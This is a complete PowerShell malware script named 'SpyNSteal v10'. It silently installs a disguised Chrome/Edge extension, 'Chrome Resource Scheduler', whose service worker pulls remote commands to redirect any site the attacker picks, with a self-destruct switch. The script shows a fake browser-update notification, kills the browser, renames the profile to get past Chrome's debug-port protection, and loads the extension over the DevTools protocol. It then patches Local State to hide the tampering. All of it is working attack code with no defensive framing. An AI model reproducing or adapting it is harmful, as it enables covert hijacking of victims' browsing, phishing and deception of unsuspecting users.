# SpyNSteal v10 - Rename profile trick + CDP Extensions.loadUnpacked
# Chrome 136+ blocks debug port on default profile path.
# We temporarily RENAME the profile dir so Chrome sees it as non-default,
# load the extension, then rename back. Same data, zero copy, zero HMAC issues.

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) {
    $ts = Get-Date -Format 'HH:mm:ss'
    try { Add-Content $LOG "$ts  $msg" } catch {}
}

function Test-Port([int]$port) {
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $ar = $tcp.BeginConnect("127.0.0.1", $port, $null, $null)
        $ok = $ar.AsyncWaitHandle.WaitOne(1500)
        if ($ok) { try { $tcp.EndConnect($ar) } catch { $ok = $false } }
        $tcp.Close(); return $ok
    } catch { return $false }
}

function Http-Get([string]$url, [int]$timeoutMs = 3000) {
    try {
        $req = [System.Net.HttpWebRequest]::Create($url)
        $req.Timeout = $timeoutMs; $req.ReadWriteTimeout = $timeoutMs
        $resp = $req.GetResponse()
        $sr = New-Object IO.StreamReader($resp.GetResponseStream())
        $body = $sr.ReadToEnd(); $sr.Close(); $resp.Close()
        return $body
    } catch { return $null }
}

function Send-WS($ws, [string]$text) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($text)
    $seg = New-Object System.ArraySegment[byte]($bytes, 0, $bytes.Length)
    $task = $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
    if (-not $task.Wait(10000)) { return $false }; return $true
}

function Recv-WS($ws, [int]$timeoutMs = 15000) {
    $buf = New-Object byte[] 131072
    $all = New-Object System.Collections.Generic.List[byte]
    $deadline = [DateTime]::Now.AddMilliseconds($timeoutMs)
    do {
        $seg = New-Object System.ArraySegment[byte]($buf, 0, $buf.Length)
        $task = $ws.ReceiveAsync($seg, [System.Threading.CancellationToken]::None)
        $remaining = [int](($deadline - [DateTime]::Now).TotalMilliseconds)
        if ($remaining -le 0) { return $null }
        if (-not $task.Wait($remaining)) { return $null }
        for ($i = 0; $i -lt $task.Result.Count; $i++) { $all.Add($buf[$i]) }
    } while (-not $task.Result.EndOfMessage)
    return [Text.Encoding]::UTF8.GetString($all.ToArray())
}

function Invoke-CDP($ws, [int]$id, [string]$method, $params) {
    $cmd = @{ id = $id; method = $method }
    if ($params) { $cmd.params = $params }
    if (-not (Send-WS $ws ($cmd | ConvertTo-Json -Depth 10 -Compress))) { return $null }
    $deadline = [DateTime]::Now.AddSeconds(20)
    while ([DateTime]::Now -lt $deadline) {
        $remaining = [int](($deadline - [DateTime]::Now).TotalMilliseconds)
        if ($remaining -le 0) { break }
        $text = Recv-WS $ws $remaining
        if (-not $text) { break }
        try {
            $obj = $text | ConvertFrom-Json
            if ($obj.PSObject.Properties["id"] -and $obj.id -eq $id) { return $obj }
        } catch {}
    }
    return $null
}

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if ($ls.profile.PSObject.Properties["exited_cleanly"]) { $ls.profile.exited_cleanly = $true }
            if ($ls.profile.PSObject.Properties["exit_type"]) { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-AllProcs([string]$procName) {
    for ($k = 0; $k -lt 25; $k++) {
        if (-not (Get-Process $procName -EA SilentlyContinue)) { return $true }
        Get-Process $procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# ============================================================================
Log "=== SpyNSteal v10 ==="

$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension at: $extDir"

$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "$name : Found=$($b.Found) Running=$($b.Running)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }

# Kill ALL browser processes
foreach ($b in $browsers) {
    $dead = Kill-AllProcs $b.Proc
    Log "$($b.Proc) killed: $dead"
}

# Extra wait to release file locks
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
$port = 9222
$origPath = $target.UserData
$tempPath = $origPath + "_dbg"

Log "--- Processing $($target.Name) ---"
Log "Original: $origPath"
Log "Temp:     $tempPath"

# Clean up any leftover temp path from a previous failed run
if (Test-Path $tempPath) {
    if (Test-Path $origPath) {
        Remove-Item $tempPath -Recurse -Force -EA SilentlyContinue
        Log "Removed stale _dbg dir"
    } else {
        Rename-Item $tempPath $origPath -Force
        Log "Restored _dbg to original (previous crash recovery)"
    }
}

# STEP 1: Rename profile dir
Log "Renaming profile..."
try {
    Rename-Item $origPath $tempPath -Force -EA Stop
    Log "Renamed to _dbg"
} catch {
    Log "RENAME FAILED: $_ - aborting"
    Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    Log "=== Done (rename failed) ==="; exit
}

# STEP 2: Launch Chrome with renamed dir + debug port
Patch-LocalState $tempPath

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $target.ExePath
$psi.Arguments = "--remote-debugging-port=$port --remote-allow-origins=* --user-data-dir=`"$tempPath`" --no-first-run"
$psi.UseShellExecute = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null
Log "Chrome launched with debug port"

# Wait for debug port
$ready = $false
for ($i = 0; $i -lt 20; $i++) {
    Start-Sleep 1
    if (Test-Port $port) {
        $ver = Http-Get "http://127.0.0.1:$port/json/version" 2000
        if ($ver) { $ready = $true; break }
    }
}

if (-not $ready) {
    Log "Debug port didn't open - restoring profile and aborting"
    Kill-AllProcs $target.Proc
    Start-Sleep 2
    Rename-Item $tempPath $origPath -Force -EA SilentlyContinue
    Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    Log "=== Done (port failed) ==="; exit
}
Log "Debug port $port active"

# STEP 3: Connect browser WS + load extension
$verObj = (Http-Get "http://127.0.0.1:$port/json/version" 3000) | ConvertFrom-Json
$browserWs = $verObj.webSocketDebuggerUrl
Log "Browser WS: $browserWs"

$ws = New-Object System.Net.WebSockets.ClientWebSocket
try {
    $ct = [System.Threading.CancellationToken]::None
    $task = $ws.ConnectAsync([Uri]$browserWs, $ct)
    if (-not $task.Wait(10000)) { throw "timeout" }
} catch {
    Log "WS failed: $_"
    Kill-AllProcs $target.Proc; Start-Sleep 2
    Rename-Item $tempPath $origPath -Force -EA SilentlyContinue
    Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"
    Log "=== Done (ws failed) ==="; exit
}
Log "WS connected"

$absPath = (Resolve-Path $extDir).Path.Replace('\','/')
Log "Extension path: $absPath"

$result = Invoke-CDP $ws 1 "Extensions.loadUnpacked" @{ path = $absPath }

$extId = ""; $cdpErr = ""
if ($result) {
    if ($result.result -and $result.result.id) { $extId = $result.result.id }
    if ($result.error) { $cdpErr = "$($result.error.message)" }
}
Log "Extension ID: $extId"
if ($cdpErr) { Log "CDP error: $cdpErr" }

try { $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"", [System.Threading.CancellationToken]::None).Wait() } catch {}
try { $ws.Dispose() } catch {}

# STEP 4: Kill debug Chrome
Log "Killing debug Chrome..."
Kill-AllProcs $target.Proc
Start-Sleep 3

# STEP 5: Rename profile back to original path
Log "Restoring profile name..."
try {
    Rename-Item $tempPath $origPath -Force -EA Stop
    Log "Profile restored to original path"
} catch {
    Log "RESTORE FAILED: $_ - CRITICAL"
    Log "User profile is at: $tempPath"
    Log "Manually rename it back to: $origPath"
}

# STEP 6: Relaunch Chrome normally
Patch-LocalState $origPath
Start-Sleep 1
Log "Relaunching Chrome..."
Start-Process -FilePath $target.ExePath -ArgumentList "--restore-last-session"

Log "=== Done (extId=$extId) ==="
